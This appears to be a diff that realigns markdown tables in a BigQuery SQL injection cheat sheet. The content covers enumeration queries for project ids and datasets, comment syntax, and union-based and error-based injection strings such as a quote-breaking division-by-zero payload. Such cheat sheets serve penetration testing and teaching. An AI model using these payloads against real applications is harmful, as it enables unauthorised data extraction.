@@ -17,18 +17,18 @@
 * Use a classic single quote to trigger an error: `'`
 * Identify BigQuery using backtick notation: ```SELECT .... FROM `` AS ...```
 
-| SQL Query                                             | Description |
-| ----------------------------------------------------- | -------------------- |
-| `SELECT @@project_id`                                 | Gathering project id |
-| `SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA` | Gathering all dataset names |
+| SQL Query                                             | Description                                       |
+| ----------------------------------------------------- | ------------------------------------------------- |
+| `SELECT @@project_id`                                 | Gathering project id                              |
+| `SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA` | Gathering all dataset names                       |
 | `select * from project_id.dataset_name.table_name`    | Gathering data from specific project id & dataset |
 
 ## BigQuery Comment
 
-| Type                       | Description                       |
-|----------------------------|-----------------------------------|
-| `#`                        | Hash comment                      |
-| `/* PostgreSQL Comment */` | C-style comment                   |
+| Type                       | Description     |
+| -------------------------- | --------------- |
+| `#`                        | Hash comment    |
+| `/* PostgreSQL Comment */` | C-style comment |
 
 ## BigQuery Union Based
 
@@ -41,10 +41,10 @@ true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT @@project_id),1,1,1,
 
 ## BigQuery Error Based
 
-| SQL Query                                                | Description          |
-| -------------------------------------------------------- | -------------------- |
-| `' OR if(1/(length((select('a')))-1)=1,true,false) OR '` | Division by zero     |
-| `select CAST(@@project_id AS INT64)`                     | Casting              |
+| SQL Query                                                | Description      |
+| -------------------------------------------------------- | ---------------- |
+| `' OR if(1/(length((select('a')))-1)=1,true,false) OR '` | Division by zero |
+| `select CAST(@@project_id AS INT64)`                     | Casting          |
 
 ## BigQuery Boolean Based
 
